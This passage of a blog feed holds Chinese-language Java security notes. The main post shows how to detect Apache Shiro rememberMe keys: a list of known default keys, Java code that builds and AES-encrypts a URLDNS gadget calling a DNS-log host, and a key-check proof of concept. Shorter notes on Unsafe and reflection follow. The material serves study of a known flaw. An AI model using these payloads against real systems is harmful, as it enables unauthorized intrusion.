        <content type="html"><![CDATA[<h1 id="Shiro之key的检测"><a href="#Shiro之key的检测" class="headerlink" title="Shiro之key的检测"></a>Shiro之key的检测</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在说 key 的检测之前，先聊聊现在工具普遍用到的 key 吧。相信在了解 shiro 之前，大家都曾用过网上公开的 shiro 利用工具，其中对于 key 的检测，普遍采用的字典的形式进行爆破，这里列举几个在字典中存在的 key：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>第一个大家应该都眼熟了，是 1.2.4 版本的默认 CipherKey，那其他 CipherKey 是哪里来的呢？网上有几种观点：</p><ul><li>一个框架配置了某一个 Shiro CipherKey，大家写的项目都用到了该框架；</li><li>大家的项目互相抄来抄去，对于 CipherKey 并未修改；</li><li>见到其他项目使用该 CipherKey，也沿袭着使用了；</li><li>……</li></ul><p>我们尝试在 github 上搜索其中一个 CipherKey 试试<br><img src="images/image-20221023221126506.png" alt="image-20221023221126506"></p><p>发现大部分项目都是使用了同一个 CipherKey，缘，妙不可言~</p><p>言归正传，说回 Key 的检测，第一想法都是用 URLDNS 这条链子来进行检测。但实战环境中，很多时候遇上的主机都是不出网，这种情况如何解决呢？</p><p>L1NK3R 师傅提出的只依赖于 Shiro 本身，在 CipherKey 检测正确时不返回 deleteMe，错误情况时返回 deleteMe 的方法，解决了上述不出网的情况。下面就逐个进行学习一下。</p><h2 id="基于URLDNS的检测方法"><a href="#基于URLDNS的检测方法" class="headerlink" title="基于URLDNS的检测方法"></a>基于URLDNS的检测方法</h2><p>通过前面的学习，听到该方法名字应该都已经懂如何构造了，先通过学习的 URLDNS 链生成文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://851bdcd2.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再通过 Shiro 的<code>AesCipherService()</code>方法对前面生成的文件进行 AES 加密得到 payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加到 rememberMe 字段发送 payload<br><img src="images/image-20221024055133461.png" alt="image-20221024055133461"></p><p>最后执行反序列化流程，执行 URLDNS 链，发起 DNS 请求，打开平台看到已经收到了请求数据。<br><img src="images/image-20221024055148343.png" alt="image-20221024055148343"></p><h2 id="基于Shiro本身的检测方法"><a href="#基于Shiro本身的检测方法" class="headerlink" title="基于Shiro本身的检测方法"></a>基于Shiro本身的检测方法</h2><p>经过测试我们可以看到，在登录后携带正常的 rememberMe 发送请求并不会在返回包中存在<code>rememberMe=deleteMe</code>，但使用正确或者错误的 CipherKey 加密构造的 rememberMe 在发送请求后，都会在返回包中看到<code>rememberMe=deleteMe</code>的响应头。</p><p>那么如果我们能够使正确的 CipherKey 加密的 payload 执行后不回显<code>deleteMe</code>，错误的 CipherKey 加密的则回显<code>deleteMe</code>，那就能达到检测 CipherKey 是否正确的目的。</p><p>接下来的任务就是看看 CipherKey 正确和错误的情况下，流程是怎么走的，进行对比和分析。</p><h3 id="密钥错误"><a href="#密钥错误" class="headerlink" title="密钥错误"></a>密钥错误</h3><p>我们把断点打在最后的<code>AbstractRememberMeManager#deserialize()</code>方法处，然后用一个错误的 CipherKey 加密 URLDNS 的链子，发送请求<br><img src="images/image-20221024045034551.png" alt="image-20221024045034551"></p><p>接在跟进<code>decrypt()</code>方法直到<code>crypt()</code>方法<br><img src="images/image-20221024045303583.png" alt="image-20221024045303583"></p><p>在这里开始因为 CipherKey 错误抛出异常，在<code>getRememberedPrincipals()</code>方法中被捕获异常<br><img src="images/image-20221024045432663.png" alt="image-20221024045432663"></p><p>这里调用到了<code>onRememberedPrincipalFailure()</code>方法，跟进该方法<br><img src="images/image-20221024045929862.png" alt="image-20221024045929862"></p><p>接着调用了<code>forgetIdentity()</code>方法<br><img src="images/image-20221024050022401.png" alt="image-20221024050022401"></p><p>继续跟进<code>forgetIdentity(request, response)</code>方法<br><img src="images/image-20221024050046499.png" alt="image-20221024050046499"></p><p>调用到了<code>removeFrom()</code>方法，继续跟进<code>removeFrom()</code>方法<br><img src="images/image-20221024050136826.png" alt="image-20221024050136826"></p><p>可以看到，在该方法中定义了<code>deleteMe</code>字段并添加到响应头中</p><h3 id="密钥正确"><a href="#密钥正确" class="headerlink" title="密钥正确"></a>密钥正确</h3><p>因为 CipherKey 正确，所以这里进入了<code>doFinal()</code>方法，不会抛出异常<br><img src="images/image-20221024050454922.png" alt="image-20221024050454922"></p><p>然后一层层返回，最后到了 <code>return this.deserialize()</code>方法<br><img src="images/image-20221024050745000.png" alt="image-20221024050745000"></p><p>跟进<code>deserialize()</code>方法<br><img src="images/image-20221024050817471.png" alt="image-20221024050817471"></p><p>这里可以看到最后套了一层<code>(PrincipalCollection)</code>将返回的类转换成<code>PrincipalCollection</code>类，但转换失败，被<code>getRememberedPrincipals()</code>捕获了异常<br><img src="images/image-20221024051026334.png" alt="image-20221024051026334"></p><p>接下来就是跟前面一样进入到了<code>removeFrom()</code>方法<br><img src="images/image-20221024051128859.png" alt="image-20221024051128859"></p><p>至此，弄懂了 CipherKey 无论正确与否，进行加密的链子都会返回<code>deleteMe</code>的原因。</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>既然在 CipherKey 正确情况下，是因为类型强转导致的进入<code>removeFrom()</code>方法，那么我们只要将序列化的对象继承于<code>PrincipalCollection</code>类即可，那就找一下<code>PrincipalCollection</code>类的实现类<img src="images/image-20221024051738473.png" alt="image-20221024051738473"></p><p>这里选择<code>SimplePrincipalCollection</code>类或者<code>SimplePrincipalMap</code>类都可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimplePrincipalCollection</span> <span class="variable">simplePrincipalCollection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimplePrincipalCollection</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(simplePrincipalCollection), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>密钥✅的情况：<br><img src="images/image-20221024055251820.png" alt="image-20221024055251820"></p><p>密钥❎的情况：<br><img src="images/image-20221024055335648.png" alt="image-20221024055335648"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>unsafe学习</title>
      <link href="/2022/11/10/unsafe%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/10/unsafe%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="unsafe学习"><a href="#unsafe学习" class="headerlink" title="unsafe学习"></a>unsafe学习</h1><h2 id="获取偏移量方法"><a href="#获取偏移量方法" class="headerlink" title="获取偏移量方法"></a>获取偏移量方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取非静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayBaseOffset</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1中的第一个元素的偏移量，即数组的基础地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的实际地址，配合staticFieldOffset方法使用，可求出变量所在的段地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayIndexScale</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1的偏移量增量。结合arrayBaseOffset(Class&lt;?&gt; var1)方法就可以求出数组中各个元素的地址。</span></span><br></pre></td></tr></table></figure><h2 id="操作属性方法"><a href="#操作属性方法" class="headerlink" title="操作属性方法"></a>操作属性方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//获取var1对象中偏移量为var2的Object对象，该方法可以无视修饰符限制。相同方法有getInt、getLong、getBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//将var1对象中偏移量为var2的Object对象的值设为var4，该方法可以无视修饰符限制。相同的方法有putInt、putLong、putBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//功能与getObject(Object var1, long var2)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有getIntVolatile、getLongVolatile、getBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有putIntVolatile、putLongVolatile、putBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的有序性(不保证可见性)，可以无视修饰符限制。相同的方法有putOrderedInt、putOrderedLong等。</span></span><br></pre></td></tr></table></figure><h2 id="操作内存方法"><a href="#操作内存方法" class="headerlink" title="操作内存方法"></a>操作内存方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">addressSize</span><span class="params">()</span>;<span class="comment">//获取本地指针大小，单位为byte，通常值为4或8。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">pageSize</span><span class="params">()</span>;<span class="comment">//获取本地内存的页数，该返回值会是2的幂次方。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">allocateMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//开辟一块新的内存块，大小为var1(单位为byte)，返回新开辟的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">reallocateMemory</span><span class="params">(<span class="type">long</span> var1, <span class="type">long</span> var3)</span>;<span class="comment">//将内存地址为var3的内存块大小调整为var1(单位为byte)，返回调整后新的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">setMemory</span><span class="params">(<span class="type">long</span> var2, <span class="type">long</span> var4, <span class="type">byte</span> var6)</span>;<span class="comment">//从实际地址var2开始将后面的字节都修改为var6，修改大小为var4(通常为0)。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">copyMemory</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, <span class="type">long</span> var5, <span class="type">long</span> var7)</span>;<span class="comment">//从对象var1中偏移量为var2的地址开始复制，复制到var4中偏移量为var5的地址，复制大小为var7。当var1为空时，var2就不是偏移量而是实际地址，当var4为空时，var5就不是偏移量而是实际地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">freeMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//释放实际地址为var1的内存。</span></span><br></pre></td></tr></table></figure><h2 id="线程挂起和恢复方法"><a href="#线程挂起和恢复方法" class="headerlink" title="线程挂起和恢复方法"></a>线程挂起和恢复方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">unpark</span><span class="params">(Object var1)</span>;<span class="comment">//将被挂起的线程var1恢复，由于其不安全性，需保证线程var1是存活的。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">park</span><span class="params">(<span class="type">boolean</span> var1, <span class="type">long</span> var2)</span>;<span class="comment">//当var2等于0时，线程会一直挂起，知道调用unpark方法才能恢复。当var2大于0时，如果var1为false，这时var2为增量时间，即线程在被挂起var2秒后会自动恢复，如果var1为true，这时var2为绝对时间，即线程被挂起后，得到具体的时间var2后才自动恢复。</span></span><br></pre></td></tr></table></figure><h2 id="CAS方法"><a href="#CAS方法" class="headerlink" title="CAS方法"></a>CAS方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, Object var5)</span>;<span class="comment">//CAS机制相关操作，对对象var1里偏移量为var2的变量进行CAS修改，var4为期待值，var5为修改值，返回修改结果。相同方法有compareAndSwapInt、compareAndSwapLong。</span></span><br></pre></td></tr></table></figure><h2 id="类加载方法"><a href="#类加载方法" class="headerlink" title="类加载方法"></a>类加载方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//判断var1类是否被初始。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//确保var1类已经被初始化。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String var1, <span class="type">byte</span>[] var2, <span class="type">int</span> var3, <span class="type">int</span> var4, ClassLoader var5, ProtectionDomain var6);<span class="comment">//定义一个类，用于动态的创建类。var1为类名，var2为类的文件数据字节数组，var3为var2的输入起点，var4为输入长度，var5为加载该类的加载器，var6为保护领域。返回创建后的类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; var1, <span class="type">byte</span>[] var2, Object[] var3);<span class="comment">//用于动态的创建匿名内部类。var1为需创建匿名内部类的类，var2为匿名内部类的文件数据字节数组，var3为修补对象。返回创建后的匿名内部类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; var1)</span> <span class="keyword">throws</span> InstantiationException;<span class="comment">//创建var1类的实例，但是不会调用var1类的构造方法，如果var1类还没有初始化，则进行初始化。返回创建实例对象。</span></span><br></pre></td></tr></table></figure><h2 id="内存屏障方法"><a href="#内存屏障方法" class="headerlink" title="内存屏障方法"></a>内存屏障方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">loadFence</span><span class="params">()</span>;<span class="comment">//所有读操作必须在loadFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">storeFence</span><span class="params">()</span>;<span class="comment">//所有写操作必须在storeFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">fullFence</span><span class="params">()</span>;<span class="comment">//所有读写操作必须在fullFence方法执行前执行完毕。</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/gaofei200/p/13951764.html">https://www.cnblogs.com/gaofei200/p/13951764.html</a></p><p><a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反射newInstance的使用方式</title>
      <link href="/2022/11/10/%E5%8F%8D%E5%B0%84newInstance%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/11/10/%E5%8F%8D%E5%B0%84newInstance%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="反射newInstance的使用方式"><a href="#反射newInstance的使用方式" class="headerlink" title="反射newInstance的使用方式"></a>反射newInstance的使用方式</h1><p>通过反射创建新的类示例，有两种方式：<br><code>Class.newInstance()</code><br><code>Constructor.newInstance()</code></p><hr><p>以下对两种调用方式给以比较说明：<br><code>Class.newInstance()</code> <strong>只能够调用无参的构造函数，即默认的构造函数；</strong><br><code>Class.newInstance()</code> <strong>要求被调用的构造函数是可见的，也即必须是public类型的;</strong> </p><hr><p><code>Constructor.newInstance()</code> <strong>可以根据传入的参数，调用任意构造构造函数。</strong> </p><p><code>Constructor.newInstance()</code> <strong>在特定的情况下，可以调用私有的构造函数。</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();<span class="comment">//获得构造函数</span></span><br><span class="line">m.setAccessible(<span class="literal">true</span>);<span class="comment">//设置构造函数为可访问</span></span><br></pre></td></tr></table></figure><hr><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 